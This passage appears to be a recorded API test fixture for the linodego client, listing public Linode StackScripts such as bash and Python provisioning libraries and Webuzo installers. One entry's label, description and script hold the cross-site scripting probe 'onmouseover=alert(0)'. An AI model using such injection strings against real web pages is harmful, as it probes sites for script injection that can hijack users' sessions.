---
version: 1
interactions:
- request:
    body: ""
    form: {}
    headers:
      Accept:
      - application/json
      Content-Type:
      - application/json
      User-Agent:
      - linodego/dev https://github.com/linode/linodego
    url: https://api.linode.com/v4beta/linode/stackscripts?page=1
    method: GET
  response:
    body: '{"data": [{"id": 623104, "username": "octane3333", "user_gravatar_id":
      "3e9341b887a3183cc653e488a37b83b8", "label": "onmouseover=alert(0)", "description":
      "onmouseover=alert(0)", "ordinal": 0, "logo_url": "", "images": ["linode/fedora29"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Initial import", "script": "#!/bin/bash\nonmouseover=alert(0)", "user_defined_fields":
      []}, {"id": 6146, "username": "north5", "user_gravatar_id": "4719cf3a5ab3123f9ee536c796788b68",
      "label": "north5_ubuntu_basic", "description": "Basic lib of bash functions",
      "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu10.04lts32bit", "linode/ubuntu10.04lts",
      "linode/ubuntu12.04lts32bit", null, "linode/ubuntu12.1032bit", "linode/ubuntu12.10"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "short hostname recoord added to /etc/hosts", "script": "#!/bin/bash\n\n# <udf
      name=\"ubuntu_mirror\" label=\"ubuntu mirror url\" default=\"http://archive.ubuntu.com/ubuntu/\">\n#
      <udf name=\"hostname\" label=\"hostname\">\n\n# Set software sources\nfunction
      set_sources_list() {\n  echo \"Adjusting sources.list (destructively)\" >> $logfile\n  CODENAME=$(lsb_release
      -sc)\n\n  cat >/etc/apt/sources.list <<EOF\ndeb $UBUNTU_MIRROR $CODENAME main
      restricted universe multiverse\ndeb-src $UBUNTU_MIRROR $CODENAME main restricted
      universe multiverse\n\ndeb $UBUNTU_MIRROR $CODENAME-updates main restricted
      universe multiverse\ndeb-src $UBUNTU_MIRROR $CODENAME-updates main restricted
      universe multiverse\n\ndeb http://security.ubuntu.com/ubuntu $CODENAME-security
      main restricted universe multiverse\ndeb-src http://security.ubuntu.com/ubuntu
      $CODENAME-security main restricted universe multiverse\nEOF\n}\n\n# Set hostname\nfunction
      set_hostname() {\n  echo \"Setting Hostname to ${HOSTNAME}\" >> $logfile\n  echo
      ${HOSTNAME} > /etc/hostname\n  hostname -F /etc/hostname\n  short=$(hostname
      -s)\n  echo \"127.0.1.1 ${short} ${short}\" >> /etc/hosts\n}\n\n# Update software
      repositories and perform upgrade\nfunction system_upgrade() {\n  echo \"Update
      system packages\" >> $logfile\n  apt-get -y update\n  apt-get -y upgrade\n}\n\n#
      Clean system packages\nfunction system_clean() {\n  apt-get -y autoremove\n  apt-get
      -y clean  \n}\n\n# Install north5 common packages\nfunction north5_packages()
      {\n  apt-get -y install build-essential\n  apt-get -y install curl htop\n\n  apt-get
      -y remove apparmor\n\n  RELEASE=$(lsb_release -sr)\n\n  # Ubuntu 12.04 already
      has these scripts integrated\n  if [[ ${RELEASE} == \"10.04\" ]]; then\n    apt-get
      -y install python-software-properties\n  fi\n}\n\n# Default log file\nlogfile=${logfile:-\"/root/stackscript.log\"}",
      "user_defined_fields": []}, {"id": 9218, "username": "webuzo", "user_gravatar_id":
      "cf0348f835d60e6d133040f49bb36ec5", "label": "OpenBiz Cubi powered by Webuzo",
      "description": "Openbiz Cubi Platform is a fast application development platform
      designed for business applications. It is built on top of the excellent Openbiz
      framework. It provides easy and intelligent development tools and implements
      almost all commonly used components, developers just need to work on their core
      business logic development. Openbiz Cubi makes application development so quick.
      \r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps users deploy
      Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP,
      Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou can
      get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation
      Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion of the
      installation process, access http://your-ip:2004 to configure OpenBiz Cubi and
      Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "OpenBiz Cubi powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install OpenBiz Cubi and Softaculous Webuzo\n# Description -\n# About Webuzo
      :\n#   Webuzo is a Single User Control Panel which helps users deploy Web Apps
      (WordPress, Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java,
      MongoDB, etc) on their virtual machines or in the cloud.\n#\n# About OpenBiz
      Cubi :\n#   Openbiz Cubi Platform is a fast application development platform
      designed for business applications.\n#   It is built on top of the excellent
      Openbiz framework. It provides easy and intelligent development \n#   tools
      and implements almost all commonly used components, developers just need to
      work on their core\n#   business logic development. Openbiz Cubi makes application
      development so quick. \n###########################################################################################################\n\n#
      Install OpenBiz Cubi Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=243&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      OpenBiz Cubi and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, OpenBiz Cubi has been successfully installed\"\necho \" \"\necho
      \"You can now configure OpenBiz Cubi and Softaculous Webuzo at the following
      URL :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing
      Softaculous Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 3, "username":
      "linode", "user_gravatar_id": "9d4d301385af69ceb7ad658aad09c142", "label": "StackScript
      Python Library", "description": "Does nothing on its own. Do not deploy directly.\r\n\r\nA
      collection of useful Python functions to be included in other StackScripts.",
      "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu14.04lts", "linode/centos7",
      "linode/debian7", "linode/debian8", "linode/fedora22"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "Initial import.", "script": "#!/usr/bin/env
      python\n\n\"\"\"\nPython Library StackScript\n\n\tAuthor: Ricardo N Feliciano
      <rfeliciano@linode.com>\n\tVersion: 1.0.0.0\n\tRequirements:\n\t\t- n/a\n\nThis
      StackScript is not meant to be directly deployed. Includes a host of\nfunctions
      to do very common task on a distro, as implemented in Python. The\nfunctions
      in this library are designed to be run accross the Linode Core\nDistributions:\n\t-
      Ubuntu\n\t- CentOS\n\t- Debian\n\t- Fedora\n\"\"\"\n\n\nimport crypt\nimport
      fcntl\nimport logging\nimport os\nimport platform\nimport pwd\nimport socket\nimport
      subprocess\nimport sys\nimport time\ntry:\n\timport apt\nexcept:\n\ttry:\n\t\timport
      yum\n\texcept:\n\t\ttry:\n\t\t\timport dnf\n\t\texcept ImportError:\n\t\t\tprint(\"Package
      manager support was not found.\")\n\t\t\t\n\ndistro = None\n\"\"\"String list:
      Contains details of the distribution.\"\"\"\n\n\ndef end():\n\t\"\"\"End the
      StackScript cleanly.\"\"\"\n\t\n\t# Should the StackScripts themselves be removed
      here at some point?\n\tlogging.info(\"The StackScript has been completed.\")\n\tsubprocess.check_output(''echo
      \"The StackScript has completed. Press enter to continue.\" | wall -n'', shell=True)\n\n\ndef
      init():\n\t\"\"\"Start features we consider StackScript standard.\"\"\"\n\t\n\t#
      Sanity check for CentOS 7 & Fedora 22\n\tif os.path.exists(\"/var/log/stackscript.log\"):\n\t\tsys.exit(1)
      # StackScript already started once, bail\n\t\n\twith open(\"/etc/profile.d/stackscript.sh\",
      \"w\") as f:\n\t\tf.write(\"\"\"#!/bin/bash\nif pgrep -f \"python /root/StackScript\"
      &>/dev/null\nthen\n\techo \"####################################################################\"\n\techo
      \"#####\"\n\techo \"#####  Warning: Your StackScript is still running\"\n\techo
      \"#####\"\n\techo \"#####\"\n\techo \"#####  Please do not make any system changes
      until it \"\n\techo \"#####  completes. Log file is located at: \"\n\techo \"#####    /var/log/stackscript.log\"\n\techo
      \"####################################################################\"\n\techo
      \" \"\nelse\n\techo \"####################################################################\"\n\techo
      \"#####\"\n\techo \"#####  The StackScript has completed. Enjoy your system.\"\n\techo
      \"#####\"\n\techo \"#####\"\n\techo \"#####  For reference, the logfile is located
      at: \"\n\techo \"#####    /var/log/stackscript.log\"\n\techo \"####################################################################\"\n\techo
      \" \"\n\trm /etc/profile.d/stackscript.sh\nfi\"\"\")\n\t\n\tlogging_start()\n\n\ndef
      logging_start(the_file=\"/var/log/stackscript.log\", the_level=logging.INFO):\n\t\"\"\"Turn
      on logging.\"\"\"\n\t\n\tlogging.basicConfig(filename=the_file, level=the_level)\n\tlogging.info(\"Logging
      has started. \" + str(time.time()))\n\n\ndef system_detect_distro():\n\t\"\"\"Prepares
      distro information.\n\t\n\tThis is critical to support the Linode Core Distributions
      with a single\n\tscript.\n\t\"\"\"\n\tglobal distro\n\n\t# add support for logging\n\t\n\tdistro
      = dict(zip((''distname'', ''version'', ''codename''),\n\tplatform.linux_distribution(full_distribution_name=0)))\n\t\n\tdistro[''distname'']
      = distro[''distname''].lower()\n\n\tif distro[''distname''] in (''debian'',
      ''ubuntu''):\n\t\tdistro[''family''] = \"debian\"\n\telif distro[''distname'']
      in (''fedora'', ''centos''):\n\t\tdistro[''family''] = \"redhat\"\n\telse:\n\t\traise
      NotImplementedError(\"This distribution is not supported.\")\n\n\ndef system_IP_get():\n\t\"\"\"Return
      IPv4 address configured on eth0.\n\t\n\tThis basically is a disgusting hack.
      Please let me know if you find a\n\tcleaner way to do this.\"\"\"\n\t# add support
      for logging\n\n\ts = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\treturn
      socket.inet_ntoa(fcntl.ioctl(\n\t\ts.fileno(),\n\t\t0x8915, # SIOCGIFADDR\n\t\tstruct.pack(''256s'',
      \"eth0\")\n\t)[20:24])\n\n\ndef system_IP_rdns(IP):\n\t\"\"\"Get PTR for given
      IP address.\"\"\"\n\t# add support for logging\n\n\treturn socket.gethostbyaddr(IP)[0]\n\n\ndef
      system_package_install(package, update_first=True):\n\t\"\"\"Install a package
      with the appropriate package manager.\"\"\"\n\t# add support for logging\n\n\tif
      distro is None:\n\t\tsystem_detect_distro()\n\n\tsystem_update() if update_first
      else None\n\t\n\tif distro[''family''] == \"debian\":\n\t\tos.environ[''DEBIAN_FRONTEND'']
      = \"noninteractive\"\n\t\tcache = apt.Cache()\n\t\tpkg = cache[package]\n\t\tpkg.mark_install()\n\t\tcache.commit()\n\telif
      distro[''distname''] == \"centos\":\n\t\tyb = yum.YumBase()\n\t\tyb.conf.assumeyes
      = True\n\t\tyb.install(name=package)\n\t\tyb.resolveDeps()\n\t\tyb.processTransaction()\n\t\tyb.close()\n\telif
      distro[''distname''] == \"fedora\":\n\t\tdnfb = dnf.Base()\n\t\tdnfb.conf.assumeyes
      = True\n\t\tdnfb.read_all_repos()\n\t\tdnfb.fill_sack()\n\t\tdnfb.install(package)\n\t\tdnfb.resolve()\n\t\tdnfb.download_packages(dnfb.transaction.install_set)\n\t\tdnfb.do_transaction()\n\t\tdnfb.close()\n\n\ndef
      system_update():\n\t\"\"\"Uses the distro''s package manager to update packages.\"\"\"\n\t#add
      support for logging\n\t\n\tif distro is None:\n\t\tsystem_detect_distro()\n\t\n\tif
      distro[''family''] == \"debian\":\n\t\tcache = apt.Cache()\n\t\tcache.update()\n\t\tcache.open(None)\n\t\tcache.upgrade()\n\t\tcache.commit()\n\telif
      distro[''distname''] == \"centos\":\n\t\tyb = yum.YumBase()\n\t\tyb.conf.assumeyes
      = True\n\t\tyb.update()\n\t\tyb.resolveDeps()\n\t\tyb.processTransaction()\n\t\tyb.close()\n\telif
      distro[''distname''] == \"fedora\":\n\t\tdnfb = dnf.Base()\n\t\tdnfb.conf.assumeyes
      = True\n\t\t#dnfb.read_all_repos() #updates were failing with this line\n\t\tdnfb.fill_sack()\n\t\tdnfb.upgrade_all()\n\t\tdnfb.resolve()\n\t\tdnfb.do_transaction()\n\t\tdnfb.close()\n\n\ndef
      user_add(username, password, groups):\n\t\"\"\"Creates a Linux user account.\n\t\n\tArgs:\n\t\tusername
      (String): A Linux username.\n\t\tpassword (String): Password for the user.\n\t\tgroups
      (tuple): Groups that the user should be added to.\n\t\n\tReturns:\n\t\tbool:
      True if successful, False otherwise.\n\t\"\"\"\n\n\t# need to implement logging\n\t#
      need to implement group functionality\n\n\treturn subprocess.call([''useradd'',
      ''-m'', ''-p'', crypt.crypt(password, \"22\"), ''-s'', ''/bin/bash'', username])\n\n\ndef
      user_add_pubkey(username, key):\n\t\"\"\"Adds the public SSH key to the specified
      user.\"\"\"\n\t# need to implement logging\n\t\n\tif username != \"root\":\n\t\tos.seteuid(pwd.getpwnam(username).pw_uid)\n\t\tos.setegid(pwd.getpwnam(username).pw_gid)\n\t\n\tpubkey_dir
      = os.path.join(os.getenv(\"HOME\"), \".ssh\")\n\t\n\tif not os.path.isdir(pubkey_dir):\n\t\tos.makedirs(pubkey_dir)\n\t\n\twith
      open(os.path.join(pubkey_dir, \"authorized_keys\")) as f:\n\t\tf.write(key)\n\t\n\tif
      username != \"root\":\n\t\tos.seteuid(0)\n\t\tos.setegid(0)", "user_defined_fields":
      []}, {"id": 9219, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "PRADO powered by Webuzo", "description": "PRADO is a component-based
      and event-driven programming framework for developing Web applications in PHP
      5.\r\nPRADO stands for PHP Rapid Application Development Object-oriented.\r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      PRADO and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "PRADO powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install PRADO and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About PRADO :\n#   PRADO
      is a component-based and event-driven programming framework for developing Web
      \n#   applications in PHP 5. PRADO stands for PHP Rapid Application Development
      Object-oriented.\n###########################################################################################################\n\n#
      Install PRADO Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=221&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      PRADO and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, PRADO has been successfully installed\"\necho \" \"\necho
      \"You can now configure PRADO and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 9220, "username":
      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "BIGACE
      powered by Webuzo", "description": "BIGACE is a free and professional grade
      software package that allows you to set up your own website within minutes.\r\n\r\nIts
      powerful backend puts you in full control of the layout and content of your
      pages. And when you need more, you can choose from many Plugins and Themes to
      extend it.\r\n\r\nBigace is designed to provide you with all the features you
      need from a CMS while having complete freedom to customize it the way you want.
      \r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps users deploy
      Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP,
      Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou can
      get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation
      Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion of the
      installation process, access http://your-ip:2004 to configure BIGACE and Softaculous
      Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal": 0,
      "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "BIGACE powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install BIGACE and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About BIGACE :\n#   BIGACE
      is a free and professional grade software package that allows you to set up
      your own website within minutes.\n#   Its powerful backend puts you in full
      control of the layout and content of your pages.\n#   And when you need more,
      you can choose from many Plugins and Themes to extend it.\n###########################################################################################################\n\n#
      Install BIGACE Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=400&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      BIGACE and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, BIGACE has been successfully installed\"\necho \" \"\necho
      \"You can now configure BIGACE and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 84996, "username":
      "tkelso", "user_gravatar_id": "2c62e010d29d49a6d80959d24e5c4bb0", "label": "Library_Bash",
      "description": "Bash Library for StackScripts\r\n** FUNCTIONS ONLY **", "ordinal":
      0, "logo_url": "", "images": ["linode/centos7", "linode/debian8", "linode/ubuntu16.04lts"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "v0.5.0", "script": "#!/bin/bash\n\n# Complete Bash Library\n# v0.5.0\n\n# Supported
      Distributions\n#########################\n# Debian 8\n# Ubuntu 16.04\n# Ubuntu
      12.04\n# CentOS 7\n#########################\n\n# Notes\n#########################\n#
      Add function_restart_services\n# Add goodstuff\n# Deeper fail2ban configuration\n#
      Percentage based service tuning\n# Incorperate deprecated functions into new
      distros\n#########################\n\n# System Ubuntu\n###############\n\nfunction
      ubuntu1604_set_hostname {\n\t# Sets hostname and updates /etc/hosts file\n\n\tHOSTNAME=\"$1\"  \n    if
      [ ! -n \"$HOSTNAME\" ]; then\n        echo \"Hostname Not Defined.\"\n        return
      1;\n    fi\n    \n    hostnamectl set-hostname $1\n    sed -i \"s/ubuntu/$1/g\"
      /etc/hosts\n}\n\nfunction ubuntu1604_update {\n\t# Configures Apt, disables
      interactive prompt, updates repositories and upgrades system packages.\n\n\t#
      Forces Apt to use IPv4\n\techo ''Acquire::ForceIPv4 \"true\";'' > /etc/apt/apt.conf.d/99force-ipv4\n\t#
      Disables interactive prompts\n\texport DEBIAN_FRONTEND=noninteractive\n\t# Updates
      Repositories and Upgrades Packages\n\tapt-get update && apt-get upgrade -y\n}\n\nfunction
      ubuntu1604_install_additional {\n\t# Install additional system packages\n\t\n\tapt-get
      install -y fail2ban vim screen\n}\n\nfunction ubuntu1604_restart_lamp {\n\tsystemctl
      restart apache2\n\tsystemctl restart mysql\n}\n\n# Users Ubuntu and Authentication\n#################################\n\nfunction
      ubuntu1604_user_add_sudo {\n    # Installs sudo, creates non-root user and adds
      the user to the sudo group\n\n    USERNAME=\"$1\"\n    USERPASS=\"$2\"\n    if
      [ ! -n \"$USERNAME\" ] || [ ! -n \"$USERPASS\" ]; then\n        echo \"No username
      and/or password entered.\"\n        return 1;\n    fi\n    \n    apt-get -y
      install sudo\n    adduser $USERNAME --disabled-password --gecos \"\"\n    echo
      \"$USERNAME:$USERPASS\" | chpasswd\n    usermod -aG sudo $USERNAME\n}\n\nfunction
      ubuntu1604_key_user {\n\t# Adds public SSH key to non-root user\n\n\tUSERNAME=\"$1\"\n    KEY=\"$2\"\n    if
      [ ! -n \"$USERNAME\" ] || [ ! -n \"$KEY\" ];\tthen\n        echo \"No username
      and/or public key entered.\"\n        return 1;\n    fi\n\n\tmkdir /home/$1/.ssh\n\techo
      $2 > /home/$1/.ssh/authorized_keys\n\tchown -R $1:$1 /home/$1/*\n\tchown -R
      $1:$1 /home/$1/.*\n}\n\nfunction ubuntu1604_ssh_disable_root {\n\t# Disables
      Root SSH Access and restarts SSH\n\n    sed -i -e ''s/PermitRootLogin\\ yes/PermitRootLogin\\
      no/g'' /etc/ssh/sshd_config\n    systemctl restart ssh  \n}\n\nfunction ubuntu1604_secure_apache
      {\n\t# Updates /etc/apache2/conf-available/security.conf with restrictive settings\n\n\tsed
      -i -e ''s/\\#ServerSignature\\ Off/ServerSignature\\ Off/g'' /etc/apache2/conf-available/security.conf\n\tsed
      -i -e ''s/ServerSignature\\ On/\\#ServerSignature\\ On/g'' /etc/apache2/conf-available/security.conf\n\tsed
      -i -e ''s/\\#ServerTokens\\ Minimal/ServerTokens\\ Minimal/g'' /etc/apache2/conf-available/security.conf\n\tsed
      -i -e ''s/ServerTokens\\ OS/\\#ServerTokens\\ OS/g'' /etc/apache2/conf-available/security.conf\n}\n\n#
      System Debian 8\n#################\n\nfunction debian8_set_hostname {\n\t# Sets
      hostname and updates /etc/hosts file\n\n\tHOSTNAME=\"$1\"  \n    if [ ! -n \"$HOSTNAME\"
      ]; then\n        echo \"Hostname Not Defined.\"\n        return 1;\n    fi\n    \n    hostnamectl
      set-hostname $1\n    sed -i \"s/debian/$1/g\" /etc/hosts\n}\n\nfunction debian8_update
      {\n\t# Configures Apt, disables interactive prompt, updates repositories and
      upgrades system packages.\n\n\t# Forces Apt to use IPv4\n\techo ''Acquire::ForceIPv4
      \"true\";'' > /etc/apt/apt.conf.d/99force-ipv4\n\t# Disables interactive prompts\n\texport
      DEBIAN_FRONTEND=noninteractive\n\t# Updates Repositories and Upgrades Packages\n\tapt-get
      update && apt-get upgrade -y\n}\n\nfunction debian8_install_additional {\n\t#
      Install additional system packages\n\t\n\tapt-get install -y fail2ban vim screen\n}\n\nfunction
      debian8_restart_lamp {\n\tsystemctl restart apache2\n\tsystemctl restart mysql\n}\n\n#
      Debian 8 Users and Authentication\n###################################\n\nfunction
      debian8_user_add_sudo {\n    # Installs sudo, creates non-root user and adds
      the user to the sudo group\n\n    USERNAME=\"$1\"\n    USERPASS=\"$2\"\n    if
      [ ! -n \"$USERNAME\" ] || [ ! -n \"$USERPASS\" ]; then\n        echo \"No username
      and/or password entered.\"\n        return 1;\n    fi\n    \n    apt-get -y
      install sudo\n    adduser $USERNAME --disabled-password --gecos \"\"\n    echo
      \"$USERNAME:$USERPASS\" | chpasswd\n    usermod -aG sudo $USERNAME\n}\n\nfunction
      debian8_key_user {\n\t# Adds public SSH key to non-root user\n\n\tUSERNAME=\"$1\"\n    KEY=\"$2\"\n    if
      [ ! -n \"$USERNAME\" ] || [ ! -n \"$KEY\" ];\tthen\n        echo \"No username
      and/or public key entered.\"\n        return 1;\n    fi\n\n\tmkdir /home/$1/.ssh\n\techo
      $2 > /home/$1/.ssh/authorized_keys\n\tchown -R $1:$1 /home/$1/*\n\tchown -R
      $1:$1 /home/$1/.*\n}\n\nfunction debian8_ssh_disable_root {\n\t# Disables Root
      SSH Access and restarts SSH\n\n    sed -i -e ''s/PermitRootLogin\\ yes/PermitRootLogin\\
      no/g'' /etc/ssh/sshd_config\n    systemctl restart ssh  \n}\n\nfunction debian8_secure_apache
      {\n\t# Updates /etc/apache2/conf-available/security.conf with restrictive settings\n\n\tsed
      -i -e ''s/\\#ServerSignature\\ Off/ServerSignature\\ Off/g'' /etc/apache2/conf-available/security.conf\n\tsed
      -i -e ''s/ServerSignature\\ On/\\#ServerSignature\\ On/g'' /etc/apache2/conf-available/security.conf\n\tsed
      -i -e ''s/\\#ServerTokens\\ Minimal/ServerTokens\\ Minimal/g'' /etc/apache2/conf-available/security.conf\n\tsed
      -i -e ''s/ServerTokens\\ OS/\\#ServerTokens\\ OS/g'' /etc/apache2/conf-available/security.conf\n}\n\n#
      System CentOS 7\n#################\n\nfunction centos7_set_hostname {\n\t# Sets
      hostname and updates /etc/hosts file\n\n\tHOSTNAME=\"$1\"       \n    if [ !
      -n \"$HOSTNAME\" ]; then\n        echo \"Hostname undefined\"\n        return
      1;\n    fi\n    \n    hostnamectl set-hostname $1\n    sed -i \"s/localhost/$1/g\"
      /etc/hosts\n}\n\nfunction centos7_update {\n\t# Full system update\n\n\tyum
      update -y\n}\n\nfunction centos7_install_epel-release {\n\tyum install epel-release
      -y\n}\n\nfunction centos7_system_primary_ip {\n    # returns the primary IP
      assigned to eth0\n    echo $(ifconfig eth0 | awk -F: ''/inet addr:/ {print $2}''
      | awk ''{ print $1 }'')\n}\n\nfunction centos7_get_rdns {\n    # calls host
      on an IP address and returns its reverse dns\n\n    if [ ! -e /usr/bin/host
      ]; then\n        aptitude -y install dnsutils > /dev/null\n    fi\n    echo
      $(host $1 | awk ''/pointer/ {print $5}'' | sed ''s/\\.$//'')\n}\n\nfunction
      centos7_get_rdns_primary_ip {\n    # returns the reverse dns of the primary
      IP assigned to this system\n    echo $(get_rdns $(system_primary_ip))\n}\n\nfunction
      centos7_install_additional {\n\t# Installs additional system packages and enabled
      Mariadb to start on boot.\n\n\tyum install -y fail2ban vim screen\n\tsystemctl
      enable mariadb\n}\n\nfunction centos7_restart_lamp {\n\tsystemctl restart httpd\n\tsystemctl
      restart mariadb\n}\n\n# Users CentOS 7\n################\n\nfunction centos7_user_add_sudo
      {\n\t# Installs Sudo, adds non-root user and adds non-root user to wheel group.\n\n    USERNAME=\"$1\"\n    USERPASS=\"$2\"\n    if
      [ ! -n \"$USERNAME\" ] || [ ! -n \"$USERPASS\" ]; then\n        echo \"No new
      username and/or password entered\"\n        return 1;\n    fi\n    \n    yum
